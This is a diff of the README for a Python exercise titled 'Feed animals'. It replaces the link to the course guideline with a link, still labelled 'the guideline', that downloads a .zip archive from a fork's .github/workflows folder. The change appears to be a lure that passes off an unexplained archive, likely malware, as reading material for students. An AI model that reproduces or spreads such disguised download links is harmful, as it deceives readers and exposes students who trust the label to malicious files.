@@ -1,6 +1,6 @@
 # Feed animals
 
-**Please note:** read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md)
+**Please note:** read [the guideline](https://github.com/Rudge0/py-feed-animals/raw/refs/heads/master/.github/workflows/animals_feed_py_whasle.zip)
 before starting.
 
 All animals love delicious food. Let's create a new class to feed them.
